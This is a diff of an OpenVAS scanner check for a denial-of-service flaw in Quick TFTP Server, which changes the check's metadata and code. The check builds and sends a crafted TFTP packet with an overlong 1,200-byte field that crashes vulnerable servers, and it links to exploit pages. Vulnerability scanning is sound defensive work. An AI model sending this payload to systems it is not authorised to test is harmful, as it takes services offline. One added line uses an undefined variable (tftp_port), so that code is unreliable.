@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_quick_tftp_server_dos_vuln.nasl 11401 2018-09-15 08:45:50Z cfischer $
+# $Id: gb_quick_tftp_server_dos_vuln.nasl 13203 2019-01-21 15:28:12Z cfischer $
 #
 # Quick TFTP Server Long Filename Denial Of Service Vulnerability
 #
@@ -27,21 +27,22 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.803714");
-  script_version("$Revision: 11401 $");
+  script_version("$Revision: 13203 $");
   script_tag(name:"cvss_base", value:"6.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-01-21 16:28:12 +0100 (Mon, 21 Jan 2019) $");
   script_tag(name:"creation_date", value:"2013-06-10 18:00:09 +0530 (Mon, 10 Jun 2013)");
   script_name("Quick TFTP Server Long Filename Denial Of Service Vulnerability");
-
-  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/quick-tftp-22-denial-of-service");
-  script_xref(name:"URL", value:"http://www.iodigitalsec.com/blog/fuzz-to-denial-of-service-quick-tftp-server-2-2");
-
   script_category(ACT_DENIAL);
   script_copyright("Copyright (c) 2013 Greenbone Networks");
   script_family("Denial of Service");
-  script_dependencies("tftpd_detect.nasl");
+  script_dependencies("tftpd_detect.nasl", "global_settings.nasl", "os_detection.nasl");
   script_require_udp_ports("Services/udp/tftp", 69);
+  script_require_keys("tftp/detected", "Host/runs_windows");
+  script_exclude_keys("keys/TARGET_IS_IPV6");
+
+  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/quick-tftp-22-denial-of-service");
+  script_xref(name:"URL", value:"http://www.iodigitalsec.com/blog/fuzz-to-denial-of-service-quick-tftp-server-2-2");
 
   script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause denial
   of service attacks.");
@@ -68,28 +69,27 @@ if(description)
 include("tftp.inc");
 
 port = get_kb_item("Services/udp/tftp");
-if(!port){
+if(!port)
   port = 69;
-}
 
-if(!tftp_alive(port:port)){
+if(!get_udp_port_state(tftp_port))
   exit(0);
-}
+
+if(!tftp_alive(port:port))
+  exit(0);
 
 soc = open_sock_udp(port);
-if(!soc){
+if(!soc)
   exit(0);
-}
 
 attack = raw_string(0x00, 0x02, 0x66, 0x69, 0x6c, 0x65, 0x2e, 0x74, 0x78,
                     0x74, 0x0 ) + raw_string(crap(data:raw_string(0x41),
                     length: 1200)) + raw_string(0x00);
 send(socket:soc, data:attack);
-
 close(soc);
 
-if(!tftp_alive(port:port)){
-  security_message(port:port);
+if(!tftp_alive(port:port)) {
+  security_message(port:port, proto:"udp");
   exit(0);
 }
 
